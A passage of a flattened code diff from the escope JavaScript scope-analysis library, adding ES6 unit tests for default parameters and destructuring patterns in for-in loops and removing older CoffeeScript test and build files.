: 3;<\n>+                    const ast = espree(code);<\n>+                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                    const scope = scopeManager.scopes[1];<\n>+                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> a<c> b]<\n>+                    expect(scope.references).to.have.length(1);<\n>+                    const reference = scope.references[0];<\n>+                    expect(reference.from).to.equal(scope);<\n>+                    expect(reference.identifier.name).to.equal('b');<\n>+                    expect(reference.resolved).to.equal(scope.variables[numVars - 1]);<\n>+                    expect(reference.writeExpr).to.not.be.undefined;<\n>+                    expect(reference.isWrite()).to.be.true;<\n>+                    expect(reference.isRead()).to.be.false;<\n>+                });<\n>+            })(name<c> code);<\n>+        }<\n>+    });<\n>+    describe('a default parameter creates a readable reference for references in right:'<c> function() {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = a) {}<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = a) {}<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = a) => {};<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            (function(name<c> code) {<\n>+                it(name<c> function() {<\n>+                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>+                    const ast = espree(code);<\n>+                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                    const scope = scopeManager.scopes[1];<\n>+                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                    const reference = scope.references[1];<\n>+                    expect(reference.from).to.equal(scope);<\n>+                    expect(reference.identifier.name).to.equal('a');<\n>+                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                    expect(reference.writeExpr).to.be.undefined;<\n>+                    expect(reference.isWrite()).to.be.false;<\n>+                    expect(reference.isRead()).to.be.true;<\n>+                });<\n>+            })(name<c> code);<\n>+        }<\n>+    });<\n>+    describe('a default parameter creates a readable reference for references in right (for const):'<c> function() {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                const a = 0;<\n>+                function foo(b = a) {}<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                const a = 0;<\n>+                let foo = function(b = a) {}<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                const a = 0;<\n>+                let foo = (b = a) => {};<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            (function(name<c> code) {<\n>+                it(name<c> function() {<\n>+                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>+                    const ast = espree(code);<\n>+                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                    const scope = scopeManager.scopes[1];<\n>+                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                    const reference = scope.references[1];<\n>+                    expect(reference.from).to.equal(scope);<\n>+                    expect(reference.identifier.name).to.equal('a');<\n>+                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                    expect(reference.writeExpr).to.be.undefined;<\n>+                    expect(reference.isWrite()).to.be.false;<\n>+                    expect(reference.isRead()).to.be.true;<\n>+                });<\n>+            })(name<c> code);<\n>+        }<\n>+    });<\n>+    describe('a default parameter creates a readable reference for references in right (partial):'<c> function() {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = a.c) {}<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = a.c) {}<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = a.c) => {};<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            (function(name<c> code) {<\n>+                it(name<c> function() {<\n>+                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>+                    const ast = espree(code);<\n>+                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>+                    const scope = scopeManager.scopes[1];<\n>+                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>+                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>+                    const reference = scope.references[1];<\n>+                    expect(reference.from).to.equal(scope);<\n>+                    expect(reference.identifier.name).to.equal('a');<\n>+                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                    expect(reference.writeExpr).to.be.undefined;<\n>+                    expect(reference.isWrite()).to.be.false;<\n>+                    expect(reference.isRead()).to.be.true;<\n>+                });<\n>+            })(name<c> code);<\n>+        }<\n>+    });<\n>+    describe('a default parameter creates a readable reference for references in right\'s nested scope:'<c> function() {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `<\n>+                let a;<\n>+                function foo(b = function() { return a; }) {}<\n>+            `<c><\n>+            FunctionExpression: `<\n>+                let a;<\n>+                let foo = function(b = function() { return a; }) {}<\n>+            `<c><\n>+            ArrowExpression: `<\n>+                let a;<\n>+                let foo = (b = function() { return a; }) => {};<\n>+            `<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            (function(name<c> code) {<\n>+                it(name<c> function() {<\n>+                    const ast = espree(code);<\n>+                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+                    expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous]<\n>+                    const scope = scopeManager.scopes[2];<\n>+                    expect(scope.variables).to.have.length(1);  // [arguments]<\n>+                    expect(scope.references).to.have.length(1);  // [a]<\n>+                    const reference = scope.references[0];<\n>+                    expect(reference.from).to.equal(scope);<\n>+                    expect(reference.identifier.name).to.equal('a');<\n>+                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>+                    expect(reference.writeExpr).to.be.undefined;<\n>+                    expect(reference.isWrite()).to.be.false;<\n>+                    expect(reference.isRead()).to.be.true;<\n>+                });<\n>+            })(name<c> code);<\n>+        }<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import harmony from '../third_party/esprima';<\n>+import espree from '../third_party/espree';<\n>+import { analyze } from '..';<\n>+describe('ES6 destructuring assignments'<c> function() {<\n>+    it('Pattern in var in ForInStatement'<c> function() {<\n>+        const ast = harmony.parse(`<\n>+            (function () {<\n>+                for (var [a<c> b<c> c] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(1);<\n>+        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.variables[1].name).to.be.equal('a');<\n>+        expect(scope.variables[2].name).to.be.equal('b');<\n>+        expect(scope.variables[3].name).to.be.equal('c');<\n>+        expect(scope.references).to.have.length(4);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].partial).to.be.true;<\n>+        expect(scope.references[0].resolved).to.be.equal(scope.variables[1]);<\n>+        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>+        expect(scope.references[1].isWrite()).to.be.true;<\n>+        expect(scope.references[1].partial).to.be.true;<\n>+        expect(scope.references[1].resolved).to.be.equal(scope.variables[2]);<\n>+        expect(scope.references[2].identifier.name).to.be.equal('c');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].partial).to.be.true;<\n>+        expect(scope.references[2].resolved).to.be.equal(scope.variables[3]);<\n>+        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>+        expect(scope.references[3].isWrite()).to.be.false;<\n>+    });<\n>+    it('Pattern in let in ForInStatement'<c> function() {<\n>+        const ast = harmony.parse(`<\n>+            (function () {<\n>+                for (let [a<c> b<c> c] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(1);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.equal('TDZ');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.equal('array');<\n>+        expect(scope.references[0].isWrite()).to.be.false;<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scope.type).to.equal('for');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].identifier.name).to.equal('a');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].partial).to.be.true;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[0]);<\n>+        expect(scope.references[1].identifier.name).to.equal('b');<\n>+        expect(scope.references[1].isWrite()).to.be.true;<\n>+        expect(scope.references[1].partial).to.be.true;<\n>+        expect(scope.references[1].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[2].identifier.name).to.equal('c');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].partial).to.be.true;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[2]);<\n>+    });<\n>+    it('Pattern with default values in var in ForInStatement'<c> function() {<\n>+        const ast = espree(`<\n>+            (function () {<\n>+                for (var [a<c> b<c> c = d] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(2);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal('array');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.equal('function');<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.equal('arguments');<\n>+        expect(scope.variables[1].name).to.equal('a');<\n>+        expect(scope.variables[2].name).to.equal('b');<\n>+        expect(scope.variables[3].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(6);<\n>+        expect(scope.references[0].identifier.name).to.equal('c');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].writeExpr.name).to.equal('d');<\n>+        expect(scope.references[0].partial).to.be.false;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[1].identifier.name).to.equal('d');<\n>+        expect(scope.references[1].isWrite()).to.be.false;<\n>+        expect(scope.references[2].identifier.name).to.equal('a');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].partial).to.be.true;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[3].identifier.name).to.equal('b');<\n>+        expect(scope.references[3].isWrite()).to.be.true;<\n>+        expect(scope.references[3].partial).to.be.true;<\n>+        expect(scope.references[3].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[4].identifier.name).to.equal('c');<\n>+        expect(scope.references[4].isWrite()).to.be.true;<\n>+        expect(scope.references[4].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[4].partial).to.be.true;<\n>+        expect(scope.references[4].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[5].identifier.name).to.equal('array');<\n>+        expect(scope.references[5].isWrite()).to.be.false;<\n>+    });<\n>+    it('Pattern with default values in let in ForInStatement'<c> function() {<\n>+        const ast = espree(`<\n>+            (function () {<\n>+                for (let [a<c> b<c> c = d] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(2);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>+        expect(scope.implicit.left[0].from.type).to.equal('TDZ');<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal('d');<\n>+        expect(scope.implicit.left[1].from.type).to.equal('for');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.equal('TDZ');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.equal('array');<\n>+        expect(scope.references[0].isWrite()).to.be.false;<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scope.type).to.equal('for');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(5);<\n>+        expect(scope.references[0].identifier.name).to.equal('c');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].writeExpr.name).to.equal('d');<\n>+        expect(scope.references[0].partial).to.be.false;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[1].identifier.name).to.equal('d');<\n>+        expect(scope.references[1].isWrite()).to.be.false;<\n>+        expect(scope.references[2].identifier.name).to.equal('a');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[2].partial).to.be.true;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[0]);<\n>+        expect(scope.references[3].identifier.name).to.equal('b');<\n>+        expect(scope.references[3].isWrite()).to.be.true;<\n>+        expect(scope.references[3].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[3].partial).to.be.true;<\n>+        expect(scope.references[3].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[4].identifier.name).to.equal('c');<\n>+        expect(scope.references[4].isWrite()).to.be.true;<\n>+        expect(scope.references[4].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[4].partial).to.be.true;<\n>+        expect(scope.references[4].resolved).to.equal(scope.variables[2]);<\n>+    });<\n>+    it('Pattern with nested default values in var in ForInStatement'<c> function() {<\n>+        const ast = espree(`<\n>+            (function () {<\n>+                for (var [a<c> [b<c> c = d] = e] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(3);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal('e');<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal('array');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.equal('function');<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.equal('arguments');<\n>+        expect(scope.variables[1].name).to.equal('a');<\n>+        expect(scope.variables[2].name).to.equal('b');<\n>+        expect(scope.variables[3].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(9);<\n>+        expect(scope.references[0].identifier.name).to.equal('b');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].writeExpr.name).to.equal('e');<\n>+        expect(scope.references[0].partial).to.be.true;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[1].identifier.name).to.equal('c');<\n>+        expect(scope.references[1].isWrite()).to.be.true;<\n>+        expect(scope.references[1].writeExpr.name).to.equal('e');<\n>+        expect(scope.references[1].partial).to.be.true;<\n>+        expect(scope.references[1].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[2].identifier.name).to.equal('c');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>+        expect(scope.references[2].partial).to.be.false;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[3].identifier.name).to.equal('d');<\n>+        expect(scope.references[3].isWrite()).to.be.false;<\n>+        expect(scope.references[4].identifier.name).to.equal('e');<\n>+        expect(scope.references[4].isWrite()).to.be.false;<\n>+        expect(scope.references[5].identifier.name).to.equal('a');<\n>+        expect(scope.references[5].isWrite()).to.be.true;<\n>+        expect(scope.references[5].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[5].partial).to.be.true;<\n>+        expect(scope.references[5].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[6].identifier.name).to.equal('b');<\n>+        expect(scope.references[6].isWrite()).to.be.true;<\n>+        expect(scope.references[6].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[6].partial).to.be.true;<\n>+        expect(scope.references[6].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[7].identifier.name).to.equal('c');<\n>+        expect(scope.references[7].isWrite()).to.be.true;<\n>+        expect(scope.references[7].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[7].partial).to.be.true;<\n>+        expect(scope.references[7].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[8].identifier.name).to.equal('array');<\n>+        expect(scope.references[8].isWrite()).to.be.false;<\n>+    });<\n>+    it('Pattern with nested default values in let in ForInStatement'<c> function() {<\n>+        const ast = espree(`<\n>+            (function () {<\n>+                for (let [a<c> [b<c> c = d] = e] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(4);  // [global<c> function<c> TDZ<c> for]<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(3);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>+        expect(scope.implicit.left[0].from.type).to.equal('TDZ');<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal('d');<\n>+        expect(scope.implicit.left[1].from.type).to.equal('for');<\n>+        expect(scope.implicit.left[2].identifier.name).to.equal('e');<\n>+        expect(scope.implicit.left[2].from.type).to.equal('for');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.equal('TDZ');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.equal('array');<\n>+        expect(scope.references[0].isWrite()).to.be.false;<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scope.type).to.equal('for');<\n>+        expect(scope.variables).to.have.length(3);<\n>+        expect(scope.variables[0].name).to.equal('a');<\n>+        expect(scope.variables[1].name).to.equal('b');<\n>+        expect(scope.variables[2].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(8);<\n>+        expect(scope.references[0].identifier.name).to.equal('b');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].writeExpr.name).to.equal('e');<\n>+        expect(scope.references[0].partial).to.be.true;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[1].identifier.name).to.equal('c');<\n>+        expect(scope.references[1].isWrite()).to.be.true;<\n>+        expect(scope.references[1].writeExpr.name).to.equal('e');<\n>+        expect(scope.references[1].partial).to.be.true;<\n>+        expect(scope.references[1].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[2].identifier.name).to.equal('c');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>+        expect(scope.references[2].partial).to.be.false;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[3].identifier.name).to.equal('d');<\n>+        expect(scope.references[3].isWrite()).to.be.false;<\n>+        expect(scope.references[4].identifier.name).to.equal('e');<\n>+        expect(scope.references[4].isWrite()).to.be.false;<\n>+        expect(scope.references[5].identifier.name).to.equal('a');<\n>+        expect(scope.references[5].isWrite()).to.be.true;<\n>+        expect(scope.references[5].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[5].partial).to.be.true;<\n>+        expect(scope.references[5].resolved).to.equal(scope.variables[0]);<\n>+        expect(scope.references[6].identifier.name).to.equal('b');<\n>+        expect(scope.references[6].isWrite()).to.be.true;<\n>+        expect(scope.references[6].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[6].partial).to.be.true;<\n>+        expect(scope.references[6].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[7].identifier.name).to.equal('c');<\n>+        expect(scope.references[7].isWrite()).to.be.true;<\n>+        expect(scope.references[7].writeExpr.name).to.equal('array');<\n>+        expect(scope.references[7].partial).to.be.true;<\n>+        expect(scope.references[7].resolved).to.equal(scope.variables[2]);<\n>+    });<\n>+    it('Pattern with default values in var in ForInStatement (separate declarations)'<c> function() {<\n>+        const ast = espree(`<\n>+            (function () {<\n>+                var a<c> b<c> c;<\n>+                for ([a<c> b<c> c = d] in array);<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        expect(scope.implicit.left).to.have.length(2);<\n>+        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>+        expect(scope.implicit.left[1].identifier.name).to.equal('array');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.equal('function');<\n>+        expect(scope.variables).to.have.length(4);<\n>+        expect(scope.variables[0].name).to.equal('arguments');<\n>+        expect(scope.variables[1].name).to.equal('a');<\n>+        expect(scope.variables[2].name).to.equal('b');<\n>+        expect(scope.variables[3].name).to.equal('c');<\n>+        expect(scope.references).to.have.length(6);<\n>+        expect(scope.references[0].identifier.name).to.equal('a');<\n>+        expect(scope.references[0].isWrite()).to.be.true;<\n>+        expect(scope.references[0].partial).to.be.true;<\n>+        expect(scope.references[0].resolved).to.equal(scope.variables[1]);<\n>+        expect(scope.references[1].identifier.name).to.equal('b');<\n>+        expect(scope.references[1].isWrite()).to.be.true;<\n>+        expect(scope.references[1].partial).to.be.true;<\n>+        expect(scope.references[1].resolved).to.equal(scope.variables[2]);<\n>+        expect(scope.references[2].identifier.name).to.equal('c');<\n>+        expect(scope.references[2].isWrite()).to.be.true;<\n>+        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>+        expect(scope.references[2].partial).to.be.false;<\n>+        expect(scope.references[2].resolved).to.equal(scope.variables[3]);<\n>+        expect(scope.references[3].identifier.name).to.equal('c');<\n>+        expect(scope.references[3].isWrite()).to.be.true;<\n>+        expect(scope.references[3].writeExpr.name).to.equal('array');<\n>+        expect(scope.refer","-    coffee = require('gulp-coffee')<c><\n>-    coffee = require('coffee-script/register')<c><\n>-var TEST = [ 'test/*.coffee' ];<\n>-    ""coffee-script"": ""^1.10.0""<c><\n>-    ""gulp-coffee"": ""^2.3.1""<c><\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-esprima = require 'esprima'<\n>-harmony = require '../third_party/esprima'<\n>-escope = require '..'<\n>-describe 'arguments'<c> -><\n>-    it 'arguments are correctly materialized'<c> -><\n>-        ast = esprima.parse """"""<\n>-        (function () {<\n>-            arguments;<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        globalScope = scopeManager.scopes[0]<\n>-        expect(globalScope.type).to.be.equal 'global'<\n>-        expect(globalScope.variables).to.have.length 0<\n>-        expect(globalScope.references).to.have.length 0<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.isArgumentsMaterialized()).to.be.true<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  